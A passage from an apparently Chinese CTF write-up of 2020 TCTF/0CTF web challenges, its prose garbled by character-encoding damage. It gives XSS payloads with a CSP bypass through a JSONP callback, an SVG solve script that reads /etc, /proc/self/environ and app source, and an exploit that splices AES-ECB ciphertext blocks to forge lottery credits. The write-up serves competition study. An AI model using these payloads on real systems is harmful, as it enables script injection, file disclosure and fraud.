<p>åˆ©ç”¨meta refreshè¿›è¡Œè·³è½¬ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ”¾</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;Love you!&quot;&#125;,&#123;&quot;type&quot;:1,&quot;message&quot;:&quot;[pout\&quot;&#x2F;&gt;&lt;memetata http-equiv&#x3D;\&quot;refresh\&quot; content&#x3D;\&quot;0; url&#x3D;http:&#x2F;&#x2F;*******&#x2F;0ctf&#x2F;\&quot;&gt;&lt;&#x2F;memetata&gt;\&quot;]Me too!!!&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200703235118990.png" alt="image-20200703235118990"></p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200704000825506.png" alt="image-20200704000825506"></p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200703234318318.png" alt="image-20200703234318318"></p>
<p>è¿˜æœ‰å¦ä¸€ç§åšæ³•ï¼Œç»•è¿‡CSPï¼Œå› ä¸ºè¦åŒæºï¼Œæ‰€ä»¥è¦æ‰¾åˆ°<a href="http://pwnable.org:5000åŒæºçš„é‡Œé¢åŒ…å«alert(1)ï¼Œ@hyperrealityå¸ˆå‚…åœ¨http://pwnable.org:5000/image/DFBkps/png?callbackæ‰¾åˆ°äº†callbackå‚æ•°ï¼Œè€Œä¸”å¯ä»¥æ·»åŠ å¼•å·é—­åˆï¼Œæ„é€ å‡ºalert(1)ã€‚" target="_blank" rel="noopener">http://pwnable.org:5000åŒæºçš„é‡Œé¢åŒ…å«alert(1)ï¼Œ@hyperrealityå¸ˆå‚…åœ¨http://pwnable.org:5000/image/DFBkps/png?callbackæ‰¾åˆ°äº†callbackå‚æ•°ï¼Œè€Œä¸”å¯ä»¥æ·»åŠ å¼•å·é—­åˆï¼Œæ„é€ å‡ºalert(1)ã€‚</a></p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707165651426.png" alt="image-20200707165651426"></p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707165745653.png" alt="image-20200707165745653"></p>
<p>å°†è¿™ä¸ªé“¾æ¥æ·»åŠ åˆ°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;Love you!&quot;&#125;,&#123;&quot;type&quot;:1,&quot;message&quot;:&quot;[lmfao.png\&quot;&#x2F;&gt; &lt;script xlink:href&#x3D;\&quot;http:&#x2F;&#x2F;pwnable.org:5000&#x2F;image&#x2F;xzEHbO&#x2F;png?callback&#x3D;d&#x3D;&#39;\&quot; &#x2F;&gt; ] &quot;&#125;]</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¾—åˆ°shareçš„å›¾ç‰‡é“¾æ¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;url&quot;: &quot;http:&#x2F;&#x2F;pwnable.org:5000&#x2F;share&#x2F;eDlIfk&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>è®¿é—®<a href="http://pwnable.org:5000/image/eDlIfk/svg" target="_blank" rel="noopener">http://pwnable.org:5000/image/eDlIfk/svg</a></p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707165905869.png" alt="image-20200707165905869"></p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">import json</span><br><span class="line">&gt;import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def preview(svg_data):</span><br><span class="line"> data &#x3D; &#123;</span><br><span class="line">   &#39;data&#39;: svg_data</span><br><span class="line"> &#125;</span><br><span class="line"> response &#x3D; requests.post(&#39;http:&#x2F;&#x2F;pwnable.org:5000&#x2F;preview&#39;, data&#x3D;data)</span><br><span class="line"> print(response.text[:100])</span><br><span class="line"> resp &#x3D; json.loads(response.text)</span><br><span class="line">   </span><br><span class="line">    previewid &#x3D; resp[&quot;previewid&quot;]</span><br><span class="line">    data &#x3D; resp[&quot;data&quot;]</span><br><span class="line">   </span><br><span class="line">    return resp[&quot;previewid&quot;], resp[&quot;data&quot;]</span><br><span class="line">   </span><br><span class="line">def share(previewid):</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">      &#39;previewid&#39;: previewid</span><br><span class="line"> &#125;</span><br><span class="line">    response &#x3D; requests.post(&#39;http:&#x2F;&#x2F;pwnable.org:5000&#x2F;share&#39;, data&#x3D;data)</span><br><span class="line"> print(response.text[:100])</span><br><span class="line"> resp &#x3D; json.loads(response.text)</span><br><span class="line">   </span><br><span class="line">    return resp[&quot;url&quot;]</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   ### Stage 1: read files</span><br><span class="line">   </span><br><span class="line"># URL &#x3D; &quot;http:&#x2F;&#x2F;r0p.me&#x2F;bla.svg&quot;</span><br><span class="line">   # URL &#x3D; &quot;text:&#x2F;etc&#x2F;os-release&quot;</span><br><span class="line"># URL &#x3D; &quot;text:&#x2F;proc&#x2F;self&#x2F;environ&quot;</span><br><span class="line"># URL &#x3D; &quot;text:&#x2F;flag&quot;</span><br><span class="line"># URL &#x3D; &quot;text:&#x2F;usr&#x2F;share&#x2F;ghostscript&#x2F;9.27&#x2F;Resource&#x2F;Init&#x2F;gs_ll3.ps&quot;</span><br><span class="line"># URL &#x3D; &quot;text:&#x2F;etc&#x2F;ImageMagick-6&#x2F;policy.xml&quot;</span><br><span class="line">URL &#x3D; &quot;text:&#x2F;app&#x2F;app.py&quot;</span><br><span class="line">svg_data &#x3D; &#39;[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;Love you!&quot;&#125;,&#123;&quot;type&quot;:1,&quot;message&quot;:&quot;[lmfao.png\\&quot;&#x2F;&gt; &lt;image height&#x3D;\\&quot;1600\\&quot; width&#x3D;\\&quot;1000\\&quot; xlink:href&#x3D;\\&quot;&#39; + URL + &#39;\\&quot; &#x2F;&gt; ] &quot;&#125;]&#39;</span><br><span class="line">previewid, data &#x3D; preview(svg_data)</span><br><span class="line"></span><br><span class="line">svg_decoded &#x3D; base64.b64decode(data.split(&#39;,&#39;)[1])</span><br><span class="line"># print(svg_decoded)</span><br><span class="line"></span><br><span class="line">url &#x3D; share(previewid)</span><br><span class="line">png_link &#x3D; f&quot;&#123;url.replace(&#39;share&#39;, &#39;image&#39;)&#125;&#x2F;png&quot;</span><br><span class="line">svg_link &#x3D; f&quot;&#123;url.replace(&#39;share&#39;, &#39;image&#39;)&#125;&#x2F;svg&quot;</span><br><span class="line">print(png_link)</span><br><span class="line">print(svg_link)</span><br><span class="line"># visit_png &#x3D; requests.get(png_link) # Trigger the HTTP request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### Stage 2: get the flag</span><br><span class="line"></span><br><span class="line">def admin(link):</span><br><span class="line"> data &#x3D; &#123;</span><br><span class="line">   &#39;url&#39;: link</span><br><span class="line"> &#125;</span><br><span class="line"> response &#x3D; requests.post(&#39;http:&#x2F;&#x2F;pwnable.org:5000&#x2F;SUp3r_S3cret_URL&#x2F;0Nly_4dM1n_Kn0ws&#39;, data&#x3D;data)</span><br><span class="line"> print(response.text)</span><br><span class="line"></span><br><span class="line">   injected_previewid &#x3D; &quot;&quot;&quot;&#39; + alert(1); b &#x3D; &#123;&#39;c&#39;: &quot; &quot;&quot;&quot;</span><br><span class="line">   url &#x3D; share(injected_previewid)</span><br><span class="line">   png_link &#x3D; f&quot;&#123;url.replace(&#39;share&#39;, &#39;image&#39;)&#125;&#x2F;png&quot; # This URL returns an error which we can manipulate with callback</span><br><span class="line">   </span><br><span class="line">   malicious_link &#x3D; f&quot;&#123;png_link&#125;?callback&#x3D;a&#x3D;&#39;&quot;</span><br><span class="line"></span><br><span class="line">svg_data &#x3D; &#39;[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;Love you!&quot;&#125;,&#123;&quot;type&quot;:1,&quot;message&quot;:&quot;[lmfao.png\\&quot;&#x2F;&gt; &lt;script xlink:href&#x3D;\\&quot;&#39; + malicious_link + &#39;\\&quot; &#x2F;&gt; ] &quot;&#125;]&#39;</span><br><span class="line">previewid, data &#x3D; preview(svg_data)</span><br><span class="line">url &#x3D; share(previewid)</span><br><span class="line">svg_link &#x3D; f&quot;&#123;url.replace(&#39;share&#39;, &#39;image&#39;)&#125;&#x2F;svg&quot;</span><br><span class="line"></span><br><span class="line">path_only &#x3D; svg_link.replace(&#39;http:&#x2F;&#x2F;pwnable.org:5000&#39;, &#39;&#39;)</span><br><span class="line"></span><br><span class="line">admin(path_only)</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/hyperreality/ctf-writeups/blob/master/2020_tctf/wechat_solve.py" target="_blank" rel="noopener">https://github.com/hyperreality/ctf-writeups/blob/master/2020_tctf/wechat_solve.py</a></p>
</blockquote>
<h1 id="0x03-lottery"><a href="#0x03-lottery" class="headerlink" title="0x03 lottery"></a>0x03 lottery</h1><p><a href="http://pwnable.org:2333/index.html" target="_blank" rel="noopener">http://pwnable.org:2333/index.html</a></p>
<p>æœ‰å¦‚ä¸‹å‡ ä¸ªè·¯ç”±ï¼š</p>
<p>uer/register æ³¨å†Œ</p>
<p>user/login ç™»å½•</p>
<p>lottery/buy  ç”¨é’±ä¹°å½©ç¥¨ï¼Œå¯ä»¥å¾—åˆ°enc</p>
<p>lottery/info  å¾—åˆ°encè§£å¯†æ¶ˆæ¯,åŒ…æ‹¬userid  lotteryid  coin</p>
<p>lottery/charge å…‘æ¢</p>
<p>ä¿®æ”¹coinå’Œuseridéƒ½ä¸å¯ä»¥ï¼Œé‚£ä¹ˆå°±æ˜¯è¦åˆ†æå¯†æ–‡äº†ã€‚æ‰¾å‡ ç»„encï¼Œbase64è§£å¯†åå˜æˆåå…­è¿›åˆ¶ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">enc1 &#x3D; &quot;uO3FId8cC%2FcMSJWDrHEIrWAiUTho2AhhKiG8qMm97OFT7u7T1iP3G69pp6bKzzskQdhwNiABgT0Z7DMcD6Ak4gw7PbdNt%2BNkc1TVOlnCf3buJDg1LVhP%2B6b8pAXj6WRmfZKdxFMoBME3TgxrN8viG%2FbSt9reYD8AcCI4hIXsxZg%3D&quot;</span><br><span class="line">enc2 &#x3D; &quot;V3evI3E%2FuuiKZWrHEZ3oqoMNZp9ANL4LMFX2VtEfxIwBI8hEQRsYMDIA68eFNVSFaHSV4HX%2F1rpZXB%2BS1ml48Aw7PbdNt%2BNkc1TVOlnCf3buJDg1LVhP%2B6b8pAXj6WRmS9523eKWmeG4xnF%2F1YrQQ%2FbSt9reYD8AcCI4hIXsxZg%3D&quot;</span><br><span class="line">enc3 &#x3D; &quot;JoWNsPteqpYQPCeb4qyZmKW9YY7N4nmipnLhp5VnnKkYDhRSv4mKCV3MQ4AKjQlcBw%2F%2BpM3dZ9ZZDCFz4XXvEww7PbdNt%2BNkc1TVOlnCf3buJDg1LVhP%2B6b8pAXj6WRmseX2ZnXgak2Q9%2BrPTFTzTPbSt9reYD8AcCI4hIXsxZg%3D&quot;</span><br><span class="line">enc4 &#x3D; &quot;wHHv0RlzbcX5hjFrmcB4EnX9PDT13HUC6kRcQeOh2toHnCAvyI%2BNfi78JwhQA%2F%2F7CIG%2BiTlAsgxiPGeXkTVGAgw7PbdNt%2BNkc1TVOlnCf3buJDg1LVhP%2B6b8pAXj6WRmS9523eKWmeG4xnF%2F1YrQQ%2FbSt9reYD8AcCI4hIXsxZg%3D&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b8edc521df1c0bf70c489583ac7108ad6022513868d808612a21bca8c9bdece153eeeed3d623f71baf69a7a6cacf3b2441d870362001813d19ec331c0fa024e20c3b3db74db7e3647354d53a59c27f76ee2438352d584ffba6fca405e3e964667d929dc4532804c1374e0c6b37cbe21bf6d2b7dade603f007022388485ecc598</span><br><span class="line">b8edc521df1c0bf70c489583ac7108ad</span><br><span class="line">6022513868d808612a21bca8c9bdece1</span><br><span class="line">53eeeed3d623f71baf69a7a6cacf3b24</span><br><span class="line">41d870362001813d19ec331c0fa024e2</span><br><span class="line">0c3b3db74db7e3647354d53a59c27f76</span><br><span class="line">ee2438352d584ffba6fca405e3e96466</span><br><span class="line">7d929dc4532804c1374e0c6b37cbe21b</span><br><span class="line">f6d2b7dade603f007022388485ecc598</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">5777af23713fbae88a656ac7119de8aa830d669f4034be0b3055f656d11fc48c0123c844411b18303200ebc785355485687495e075ffd6ba595c1f92d66978f00c3b3db74db7e3647354d53a59c27f76ee2438352d584ffba6fca405e3e964664bde76dde29699e1b8c6717fd58ad043f6d2b7dade603f007022388485ecc598</span><br><span class="line">5777af23713fbae88a656ac7119de8aa</span><br><span class="line">830d669f4034be0b3055f656d11fc48c</span><br><span class="line">0123c844411b18303200ebc785355485</span><br><span class="line">687495e075ffd6ba595c1f92d66978f0</span><br><span class="line">0c3b3db74db7e3647354d53a59c27f76</span><br><span class="line">ee2438352d584ffba6fca405e3e96466</span><br><span class="line">4bde76dde29699e1b8c6717fd58ad043</span><br><span class="line">f6d2b7dade603f007022388485ecc598</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">26858db0fb5eaa96103c279be2ac9998a5bd618ecde279a2a672e1a795679ca9180e1452bf898a095dcc43800a8d095c070ffea4cddd67d6590c2173e175ef130c3b3db74db7e3647354d53a59c27f76ee2438352d584ffba6fca405e3e96466b1e5f66675e06a4d90f7eacf4c54f34cf6d2b7dade603f007022388485ecc598</span><br><span class="line">26858db0fb5eaa96103c279be2ac9998</span><br><span class="line">a5bd618ecde279a2a672e1a795679ca9</span><br><span class="line">180e1452bf898a095dcc43800a8d095c</span><br><span class="line">070ffea4cddd67d6590c2173e175ef13</span><br><span class="line">0c3b3db74db7e3647354d53a59c27f76</span><br><span class="line">ee2438352d584ffba6fca405e3e96466</span><br><span class="line">b1e5f66675e06a4d90f7eacf4c54f34c</span><br><span class="line">f6d2b7dade603f007022388485ecc598</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c071efd119736dc5f986316b99c0781275fd3c34f5dc7502ea445c41e3a1dada079c202fc88f8d7e2efc27085003fffb0881be893940b20c623c6797913546020c3b3db74db7e3647354d53a59c27f76ee2438352d584ffba6fca405e3e964664bde76dde29699e1b8c6717fd58ad043f6d2b7dade603f007022388485ecc598</span><br><span class="line">c071efd119736dc5f986316b99c07812</span><br><span class="line">75fd3c34f5dc7502ea445c41e3a1dada</span><br><span class="line">079c202fc88f8d7e2efc27085003fffb</span><br><span class="line">0881be893940b20c623c679791354602</span><br><span class="line">0c3b3db74db7e3647354d53a59c27f76</span><br><span class="line">ee2438352d584ffba6fca405e3e96466</span><br><span class="line">4bde76dde29699e1b8c6717fd58ad043</span><br><span class="line">f6d2b7dade603f007022388485ecc598</span><br><span class="line"></span><br><span class="line">å¯ä»¥çœ‹å‡ºæ˜¯åˆ†ç»„å¯†ç ï¼Œé‡‡ç”¨çš„æ˜¯ECBæ¨¡å¼</span><br><span class="line">æ¯ç»„æœ‰16å­—èŠ‚ï¼Œ128ä½</span><br><span class="line">å¯†æ–‡å…±æœ‰8ç»„ï¼Œ128å­—èŠ‚</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºæœ‰/infoå¯ä»¥è§£å¯†ï¼Œæ‰€ä»¥å¯ä»¥æµ‹è¯•åˆ†ç»„çš„è§„å¾‹ã€‚</p>
<p>ç”¨ä¸¤ä¸ªuserã€coinç›¸åŒçš„ï¼Œlotteryä¸åŒæ¥åˆ¤æ–­lotteryçš„ä½ç½®ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n634F%2Fu7aGYxw8sv3N34F7xISHbfGeHavxo82CFF6GIKsCqbsT1QJTR8X6ehi68XFnee8i%2B8x8bwoSsy2ZJnzx6n0wnptbiUy%2B729fczcNavFwXL3xBqQk9DnZWPX8q%2BeZ%2FMfLiNQVm%2FdAlU93aBTfbSt9reYD8AcCI4hIXsxZg%3D</span><br><span class="line">&#123;&quot;info&quot;:&#123;&quot;lottery&quot;:&quot;6a564b59-1a3b-4ecc-aaa1-3bd1b2cfe7b3&quot;,&quot;user&quot;:&quot;8e60dd01-be04-4932-a1c6-7eb70d57423a&quot;,&quot;coin&quot;:6&#125;&#125;</span><br><span class="line"></span><br><span class="line">xSjWMxj9VTzGLTnYR00pWHlHT2e8CKzrh%2FQg%2BWyPIBrS6pwgQBUKDEmb1toU1j08LWID2CcmlHmD3tPtP4H2dh6n0wnptbiUy%2B729fczcNavFwXL3xBqQk9DnZWPX8q%2BeZ%2FMfLiNQVm%2FdAlU93aBTfbSt9reYD8AcCI4hIXsxZg%3D</span><br><span class="line">&#123;&quot;info&quot;:&#123;&quot;lottery&quot;:&quot;fd79618b-2579-4c60-ad38-a9efea2be4ed&quot;,&quot;user&quot;:&quot;8e60dd01-be04-4932-a1c6-7eb70d57423a&quot;,&quot;coin&quot;:6&#125;&#125;</span><br><span class="line"></span><br><span class="line">9fadf817fbbb686631c3cb2fdcddf817bc484876df19e1dabf1a3cd82145e8620ab02a9bb13d5025347c5fa7a18baf1716779ef22fbcc7c6f0a12b32d99267cf1ea7d309e9b5b894cbeef6f5f73370d6af1705cbdf106a424f439d958f5fcabe799fcc7cb88d4159bf740954f776814df6d2b7dade603f007022388485ecc598</span><br><span class="line">9fadf817fbbb686631c3cb2fdcddf817</span><br><span class="line">bc484876df19e1dabf1a3cd82145e862</span><br><span class="line">0ab02a9bb13d5025347c5fa7a18baf17</span><br><span class="line">16779ef22fbcc7c6f0a12b32d99267cf</span><br><span class="line">1ea7d309e9b5b894cbeef6f5f73370d6</span><br><span class="line">af1705cbdf106a424f439d958f5fcabe</span><br><span class="line">799fcc7cb88d4159bf740954f776814d</span><br><span class="line">f6d2b7dade603f007022388485ecc598</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c528d63318fd553cc62d39d8474d295879474f67bc08aceb87f420f96c8f201ad2ea9c2040150a0c499bd6da14d63d3c2d6203d82726947983ded3ed3f81f6761ea7d309e9b5b894cbeef6f5f73370d6af1705cbdf106a424f439d958f5fcabe799fcc7cb88d4159bf740954f776814df6d2b7dade603f007022388485ecc598</span><br><span class="line">c528d63318fd553cc62d39d8474d2958</span><br><span class="line">79474f67bc08aceb87f420f96c8f201a</span><br><span class="line">d2ea9c2040150a0c499bd6da14d63d3c</span><br><span class="line">2d6203d82726947983ded3ed3f81f676</span><br><span class="line">1ea7d309e9b5b894cbeef6f5f73370d6</span><br><span class="line">af1705cbdf106a424f439d958f5fcabe</span><br><span class="line">799fcc7cb88d4159bf740954f776814d</span><br><span class="line">f6d2b7dade603f007022388485ecc598</span><br></pre></td></tr></table></figure>

<p>åå››ç»„ç›¸åŒï¼Œè¯´æ˜ç¬¬å››ç»„ä¸­å«æœ‰lotteryï¼Œå¯èƒ½å«æœ‰userçš„useridï¼ˆæ— æ³•æ‰¾åˆ°åªæœ‰useridä¸åŒçš„ä¸¤ä¸ªencï¼‰,å¯ä»¥ç”¨æ‰¾ä¸¤ä¸ªuseridä¸åŒçš„encï¼Œbaseè§£å¯†åï¼Œç¬¬ä¸€ä¸ªçš„å‰å››ç»„å’Œç¬¬äºŒä¸ªçš„åå››ç»„æ‹¼æ¥åœ¨ä¸€èµ·å‘é€ï¼Œçœ‹æ˜¯å¦æˆåŠŸã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode,b64encode</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">enc1 = <span class="string">"n634F%2Fu7aGYxw8sv3N34F7xISHbfGeHavxo82CFF6GIKsCqbsT1QJTR8X6ehi68XFnee8i%2B8x8bwoSsy2ZJnzx6n0wnptbiUy%2B729fczcNavFwXL3xBqQk9DnZWPX8q%2BeZ%2FMfLiNQVm%2FdAlU93aBTfbSt9reYD8AcCI4hIXsxZg%3D"</span></span><br><span class="line"><span class="comment">#&#123;"info":&#123;"lottery":"6a564b59-1a3b-4ecc-aaa1-3bd1b2cfe7b3","user":"8e60dd01-be04-4932-a1c6-7eb70d57423a","coin":6&#125;&#125;</span></span><br><span class="line">enc2 = <span class="string">"wHHv0RlzbcX5hjFrmcB4EnX9PDT13HUC6kRcQeOh2toHnCAvyI%2BNfi78JwhQA%2F%2F7CIG%2BiTlAsgxiPGeXkTVGAgw7PbdNt%2BNkc1TVOlnCf3buJDg1LVhP%2B6b8pAXj6WRmS9523eKWmeG4xnF%2F1YrQQ%2FbSt9reYD8AcCI4hIXsxZg%3D"</span></span><br><span class="line"><span class="comment">#&#123;"info":&#123;"lottery":"f838f210-9932-4d6a-98ae-9d22758c2554","user":"263020e2-8add-4c0c-a5dc-4659556890e5","coin":2&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ci1 = b64decode(unquote(enc1))</span><br><span class="line"><span class="keyword">print</span> ci1+<span class="string">"\n"</span></span><br><span class="line">ci2 = b64decode(unquote(enc2))</span><br><span class="line"><span class="keyword">print</span> ci2+<span class="string">"\n"</span></span><br><span class="line">ci3 = ci1[:<span class="number">64</span>]+ci2[<span class="number">64</span>:]</span><br><span class="line"><span class="keyword">print</span> ci1[:<span class="number">64</span>]</span><br><span class="line"><span class="keyword">print</span> ci2[<span class="number">64</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> b64encode(ci3)</span><br><span class="line">data = &#123;<span class="string">"enc"</span>:b64encode(ci3)&#125;</span><br><span class="line"><span class="keyword">print</span> requests.post(<span class="string">"http://pwnable.org:2333/lottery/info"</span>,data=data).text</span><br><span class="line"><span class="comment">#&#123;"info":&#123;"lottery":"6a564b59-1a3b-4ecc-aaa1-3bd1b2cfe7b3","user":"8e3020e2-8add-4c0c-a5dc-4659556890e5","coin":2&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>ä»ä¸Šé¢å¯ä»¥çœ‹å‡ºè§£å¯†å¾—åˆ°çš„ç»“æœ</p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707085633140.png" alt="image-20200707085633140"></p>
<p>åŠ å¯†æ—¶åˆ†ç»„çš„ç¬¬å››ç»„åŒ…æ‹¬useridçš„å‰ä¸¤ä½ï¼Œæ‰€ä»¥åªè¦æ³¨å†Œå‡ ä¸ªuseridçš„å‰ä¸¤ä½ç›¸åŒçš„ç”¨æˆ·ï¼Œç„¶åå°†ä¹°åˆ°å½©ç¥¨å¾—åˆ°çš„encåå››ç»„å…¨éƒ¨æ›¿æ¢åˆ°ä¸€ä¸ªuser,å°±å¯ä»¥æŠŠé’±éƒ½è½¬ç§»åˆ°ä¸€ä¸ªuserä¸­ã€‚</p>
<ol>
<li><p>æ³¨å†Œå¾—åˆ°ä¸€ä¸ªuuidå¼€å¤´æ˜¯76çš„ç”¨æˆ·ï¼Œä¿å­˜ä»–ä¹°å½©ç¥¨å¾—åˆ°çš„encã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;enc&quot;:&quot;Ht3U37\&#x2F;f5B2DfJue3XduaO9fK591DAP7mCPmZu13mZKmem+107YSQA07GKGGrezJlzhJ3cBJCvdxwpLj4N3dz\&#x2F;VxMdT9mIEQ2hBe+qQKHtagwQ3B2ZAN9gvW2j57Xpqp8zuNPhJ\&#x2F;H0kmQaeAAqobYPhIZnVHgXwIkkuehhS\&#x2F;11g&#x3D;&quot;&#125;</span><br><span class="line">&#123;&quot;info&quot;:&#123;&quot;lottery&quot;:&quot;7443b465-8661-4770-8942-d7d4fc5ec47c&quot;,&quot;user&quot;:&quot;7638b0fb-7651-4c68-a02e-dc1753a2eb10&quot;,&quot;coin&quot;:10&#125;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>ç»§ç»­æ³¨å†Œå¯»æ‰¾uuidå¼€å¤´ä¸º76çš„ç”¨æˆ·ï¼Œæ‰¾åˆ°å°±ä¹°å½©ç¥¨ï¼ˆå¯ä»¥ä¹°ä¸‰æ¬¡ï¼‰ï¼Œå°†å¾—åˆ°çš„enc base64è§£å¯†åå‰å››ç»„ï¼ŒåŠ ä¸Šå‰é¢å¾—åˆ°ç”¨æˆ·enc base64è§£å¯†çš„åå››ç»„ï¼Œå»chargeã€‚</p>
</li>
<li><p>ä¹‹åä¹°flag</p>
</li>
</ol>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode,b64encode</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">"http://pwnable.org:2333/"</span></span><br><span class="line">proxy = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(username)</span>:</span></span><br><span class="line">	data = &#123;<span class="string">"username"</span>:username,<span class="string">"password"</span>:<span class="string">"abcdefg"</span>&#125;</span><br><span class="line">	re = requests.post(url+<span class="string">"user/register"</span>,data = data,proxies=proxy)</span><br><span class="line">	<span class="keyword">return</span> json.loads(re.text)[<span class="string">"user"</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username,password=<span class="string">"abcdefg"</span>)</span>:</span></span><br><span class="line">	data = &#123;<span class="string">"username"</span>:username,<span class="string">"password"</span>:password&#125;</span><br><span class="line">	re = requests.post(url+<span class="string">"user/login"</span>,data = data,proxies=proxy)</span><br><span class="line">	<span class="keyword">return</span> json.loads(re.text)[<span class="string">"user"</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span><span class="params">(apitoken)</span>:</span></span><br><span class="line">	data = &#123;<span class="string">"api_token"</span>:apitoken&#125;</span><br><span class="line">	cookie = &#123;<span class="string">"api_token"</span>:apitoken&#125;</span><br><span class="line">	re = requests.post(url+<span class="string">"lottery/buy"</span>,data = data,cookies=cookie,proxies=proxy)</span><br><span class="line">	<span class="keyword">return</span> json.loads(re.text)[<span class="string">"enc"</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">charge</span><span class="params">(enc,apitoken)</span>:</span></span><br><span class="line">	data = &#123;<span class="string">"user"</span>:<span class="string">"7638b0fb-7651-4c68-a02e-dc1753a2eb10"</span>,<span class="string">"coin"</span>:<span class="string">"10"</span>,<span class="string">"enc"</span>:enc&#125;</span><br><span class="line">	cookie = &#123;<span class="string">"api_token"</span>:apitoken&#125;</span><br><span class="line">	re = requests.post(url+<span class="string">"lottery/charge"</span>,data = data,cookies = cookie,proxies=proxy)</span><br><span class="line">	<span class="keyword">return</span> re.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enc1 = <span class="string">"Ht3U37%2Ff5B2DfJue3XduaO9fK591DAP7mCPmZu13mZKmem%2B107YSQA07GKGGrezJlzhJ3cBJCvdxwpLj4N3dz%2FVxMdT9mIEQ2hBe%2BqQKHtagwQ3B2ZAN9gvW2j57Xpqp8zuNPhJ%2FH0kmQaeAAqobYPhIZnVHgXwIkkuehhS%2F11g%3D"</span></span><br><span class="line">ci1 = b64decode(unquote(enc1))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	username = <span class="string">''</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">10</span>))</span><br><span class="line">	user = register(username)</span><br><span class="line">	<span class="keyword">print</span> user[<span class="string">"uuid"</span>]</span><br><span class="line">	tmp = <span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span>(user[<span class="string">"uuid"</span>][:<span class="number">2</span>] == <span class="string">"76"</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">			user = login(username)</span><br><span class="line">			enc = buy(user[<span class="string">"api_token"</span>])</span><br><span class="line">			ci2 = b64decode(unquote(enc))</span><br><span class="line">			ci3 = ci2[:<span class="number">64</span>]+ci1[<span class="number">64</span>:]</span><br><span class="line">			data = &#123;<span class="string">"enc"</span>:b64encode(ci3)&#125;</span><br><span class="line">			<span class="keyword">print</span> requests.post(<span class="string">"http://pwnable.org:2333/lottery/info"</span>,data=data,proxies=proxy).text</span><br><span class="line">			<span class="keyword">print</span> charge(b64encode(ci3),user[<span class="string">"api_token"</span>])</span><br><span class="line">			tmp +=<span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> tmp &gt; <span class="number">6</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

